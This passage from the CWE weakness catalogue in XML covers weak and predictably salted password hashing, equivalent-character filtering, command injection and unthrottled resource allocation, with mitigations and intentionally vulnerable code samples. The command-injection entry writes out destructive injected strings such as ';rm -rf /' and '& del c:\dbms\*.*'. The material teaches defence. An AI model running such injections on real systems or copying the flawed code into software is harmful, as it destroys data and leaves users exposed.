                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-51">
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-101">
               <Intro_Text>In both of these examples, a user is logged in if their given password matches a stored password:</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>unsigned char *check_passwd(char *plaintext) {<xhtml:div style="margin-left:10px;">ctext = simple_digest("sha1",plaintext,strlen(plaintext), ... );<xhtml:br/>
                        <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                        <xhtml:br/>if (equal(ctext, secret_password())) {<xhtml:div style="margin-left:10px;">login_user();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String plainText = new String(plainTextIn);<xhtml:br/>MessageDigest encer = MessageDigest.getInstance("SHA");<xhtml:br/>encer.update(plainTextIn);<xhtml:br/>byte[] digest = password.digest();<xhtml:br/>
                     <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                     <xhtml:br/>if (equal(digest,secret_password())) {<xhtml:div style="margin-left:10px;">login_user();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password. Note this code also exhibits CWE-328 (Reversible One-Way Hash).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In this example, a new user provides a new username and password to create an account. The program hashes the new user's password then stores it in a database.</Intro_Text>
               <Example_Code Nature="bad" Language="Python">
                  <xhtml:div>def storePassword(userName,Password):<xhtml:div style="margin-left:10px;">hasher = hashlib.new('md5')<xhtml:br/>hasher.update(Password)<xhtml:br/>hashedPassword = hasher.digest()<xhtml:br/>
                        <xhtml:br/>
                        <xhtml:i># UpdateUserLogin returns True on success, False otherwise</xhtml:i>
                        <xhtml:br/>return updateUserLogin(userName,hashedPassword)</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While it is good to avoid storing a cleartext password, the program does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password if the database is compromised.</Body_Text>
               <Body_Text>Fixing this is as simple as providing a salt to the hashing function on initialization:</Body_Text>
               <Example_Code Nature="good" Language="Python">
                  <xhtml:div>def storePassword(userName,Password):<xhtml:div style="margin-left:10px;">hasher = hashlib.new('md5',b'SaltGoesHere')<xhtml:br/>hasher.update(Password)<xhtml:br/>hashedPassword = hasher.digest()<xhtml:br/>
                        <xhtml:br/>
                        <xhtml:i># UpdateUserLogin returns True on success, False otherwise</xhtml:i>
                        <xhtml:br/>return updateUserLogin(userName,hashedPassword)</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Note that regardless of the usage of a salt, the md5 hash is no longer considered secure, so this example still exhibits CWE-327.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-1526</Reference>
               <Description>Router does not use a salt with a hash, making it easier to crack passwords.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1526</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-1058</Reference>
               <Description>Router does not use a salt with a hash, making it easier to crack passwords.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1058</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-291"/>
            <Reference External_Reference_ID="REF-292"/>
            <Reference External_Reference_ID="REF-293" Section="5.2 PBKDF2"/>
            <Reference External_Reference_ID="REF-294"/>
            <Reference External_Reference_ID="REF-295"/>
            <Reference External_Reference_ID="REF-296"/>
            <Reference External_Reference_ID="REF-297"/>
            <Reference External_Reference_ID="REF-298"/>
            <Reference External_Reference_ID="REF-631"/>
            <Reference External_Reference_ID="REF-632"/>
            <Reference External_Reference_ID="REF-633"/>
            <Reference External_Reference_ID="REF-634"/>
            <Reference External_Reference_ID="REF-635"/>
            <Reference External_Reference_ID="REF-636"/>
            <Reference External_Reference_ID="REF-637"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Creating a Salted Hash&#34; Page 302"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Salt Values&#34;, Page 46"/>
         </References>
         
      </Weakness>
      <Weakness ID="76" Name="Improper Neutralization of Equivalent Special Elements" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software properly neutralizes certain special elements, but it improperly neutralizes equivalent special elements.</Description>
         <Extended_Description>The software may have a fixed list of special characters it believes is complete. However, there may be alternate encodings, or representations that also have the same meaning. For example, the software may filter out a leading slash (/) to prevent absolute path names, but does not account for a tilde (~) followed by a user name, which on some *nix systems could be expanded to an absolute pathname. Alternately, the software might filter a dangerous "-e" command-line switch when calling an external program, but it might not account for "--exec" or other switches that have the same semantics.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="75" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="75" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Programming languages and supporting technologies might be chosen which are not subject to these issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Utilize an appropriate mix of whitelist and blacklist parsing to filter equivalent special element syntax from all input.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Equivalent Special Element Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         
      </Weakness>
      <Weakness ID="760" Name="Use of a One-Way Hash with a Predictable Salt" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software uses a predictable salt as part of the input.</Description>
         <Extended_Description>
            <xhtml:p>This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables, effectively disabling the protection that an unpredictable salt would provide.</xhtml:p>
            <xhtml:p>It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="916" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="916" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Background_Details>
            <Background_Detail>In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-51">
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-4905</Reference>
               <Description>Blogging software uses a hard-coded salt when calculating a password hash.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4905</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1657</Reference>
               <Description>Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1657</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0967</Reference>
               <Description>Server uses a constant salt when encrypting passwords, simplifying brute force attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0967</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-291"/>
            <Reference External_Reference_ID="REF-292"/>
            <Reference External_Reference_ID="REF-293" Section="5.2 PBKDF2"/>
            <Reference External_Reference_ID="REF-294"/>
            <Reference External_Reference_ID="REF-295"/>
            <Reference External_Reference_ID="REF-296"/>
            <Reference External_Reference_ID="REF-297"/>
            <Reference External_Reference_ID="REF-298"/>
            <Reference External_Reference_ID="REF-631"/>
            <Reference External_Reference_ID="REF-632"/>
            <Reference External_Reference_ID="REF-633"/>
            <Reference External_Reference_ID="REF-634"/>
            <Reference External_Reference_ID="REF-635"/>
            <Reference External_Reference_ID="REF-636"/>
            <Reference External_Reference_ID="REF-637"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Creating a Salted Hash&#34; Page 302"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Salt Values&#34;, Page 46"/>
         </References>
         
      </Weakness>
      <Weakness ID="77" Name="Improper Neutralization of Special Elements used in a Command ('Command Injection')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Command injection vulnerabilities typically occur when:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>1. Data enters the application from an untrusted source.</xhtml:div>
               <xhtml:div>2. The data is part of a string that is executed as a command by the application.</xhtml:div>
               <xhtml:div>3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.</xhtml:div>
            </xhtml:div>
            <xhtml:p>Command injection is a common problem with wrapper programs.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>If a malicious user injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If at all possible, use library calls rather than external processes to recreate the desired functionality.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If possible, ensure that all external commands called from the program are statically created.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Run time: Run time policy enforcement may be used in a whitelist fashion to prevent use of any non-sanctioned commands.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Assign permissions to the software system that prevents the user from accessing/opening privileged files.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-30">
               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:10px;">char cmd[CMD_MAX] = "/usr/bin/cat ";<xhtml:br/>strcat(cmd, argv[1]);<xhtml:br/>system(cmd);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:10px;">c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                     <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String home = System.getProperty("APPHOME");<xhtml:br/>String cmd = home + INITCMD;<xhtml:br/>java.lang.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The code above allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is a wrapper around the UNIX command cat which prints the contents of a file to standard out. It is also injectable:</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>#include &lt;stdio.h&gt;<xhtml:br/>#include &lt;unistd.h&gt;<xhtml:br/>
                     <xhtml:br/>int main(int argc, char **argv) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>char cat[] = "cat ";<xhtml:br/>char *command;<xhtml:br/>size_t commandLength;<xhtml:br/>
                           <xhtml:br/>commandLength = strlen(cat) + strlen(argv[1]) + 1;<xhtml:br/>command = (char *) malloc(commandLength);<xhtml:br/>strncpy(command, cat, commandLength);<xhtml:br/>strncat(command, argv[1], (commandLength - strlen(cat)) );<xhtml:br/>
                           <xhtml:br/>system(command);<xhtml:br/>return (0);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Used normally, the output is simply the contents of the file requested:</Body_Text>
               <Example_Code Nature="informative">
                  <xhtml:div>$ ./catWrapper Story.txt<xhtml:br/>When last we left our heroes...</xhtml:div>
               </Example_Code>
               <Body_Text>However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>$ ./catWrapper Story.txt; ls<xhtml:br/>When last we left our heroes...<xhtml:br/>Story.txt<xhtml:br/>SensitiveFile.txt<xhtml:br/>PrivateData.db<xhtml:br/>a.out*</xhtml:div>
               </Example_Code>
               <Body_Text>If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Command Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Command injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>IDS34-PL</Entry_ID>
               <Entry_Name>Do not pass untrusted, unsanitized data to a command interpreter</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="136"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="183"/>
            <Related_Attack_Pattern CAPEC_ID="248"/>
            <Related_Attack_Pattern CAPEC_ID="40"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-140"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 10: Command Injection.&#34; Page 171"/>
         </References>
         <Notes>
            <Note Type="Terminology">
               <xhtml:p>The "command injection" phrase carries different meanings to different people. For some people, it refers to refers to any type of attack that can allow the attacker to execute commands of their own choosing, regardless of how those commands are inserted. The command injection could thus be resultant from another weakness. This usage also includes cases in which the functionality allows the user to specify an entire command, which is then executed; within CWE, this situation might be better regarded as an authorization problem (since an attacker should not be able to specify arbitrary commands.)</xhtml:p>
               <xhtml:p>Another common usage, which includes CWE-77 and its descendants, involves cases in which the attacker injects separators into the command being constructed.</xhtml:p>
            </Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="770" Name="Allocation of Resources Without Limits or Throttling" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="400" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="665" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="400" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="400" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
            <Introduction>
               <Phase>System Configuration</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>When allocating resources without limits, an attacker could prevent other systems, applications, or processes from accessing the same type of resource.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-8">
               <Method>Manual Static Analysis</Method>
               <Description>Manual static analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. If denial-of-service is not considered a significant risk, or if there is strong emphasis on consequences such as code execution, then manual analysis may not focus on this weakness at all.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Fuzzing</Method>
               <Description>
                  <xhtml:p>While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find uncontrolled resource allocation problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted software in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to limit resource allocation may be the cause.</xhtml:p>
                  <xhtml:p>When the allocation is directly affected by numeric inputs, then fuzzing may produce indications of this weakness.</xhtml:p>
               </Description>
               <Effectiveness>Opportunistic</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Certain automated dynamic analysis techniques may be effective in producing side effects of uncontrolled resource allocation problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the software within a short time frame. Manual analysis is likely required to interpret the results.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Specialized configuration or tuning may be required to train automated tools to recognize this weakness.</xhtml:p>
                  <xhtml:p>Automated static analysis typically has limited utility in recognizing unlimited allocation problems, except for the missing release of program-independent system resources such as files, sockets, and processes, or unchecked arguments to memory. For system resources, automated static analysis may be able to detect circumstances in which resources are not released after they have expired, or if too much of a resource is requested at once, as can occur with memory. Automated analysis of configuration files may be able to detect settings that do not specify a maximum value.</xhtml:p>
                  <xhtml:p>Automated static analysis tools will not be appropriate for detecting exhaustion of custom resources, such as an intended security policy in which a bulletin board user is only allowed to make a limited number of posts per day.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Clearly specify the minimum and maximum expectations for capabilities, and dictate which behaviors are acceptable when resource allocation reaches limits.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Limit the amount of resources that are accessible to unprivileged users. Set per-user limits for resources. Allow the system administrator to define these limits. Be careful to avoid CWE-410.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Design throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place, and it will help the administrator to identify who is committing the abuse. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
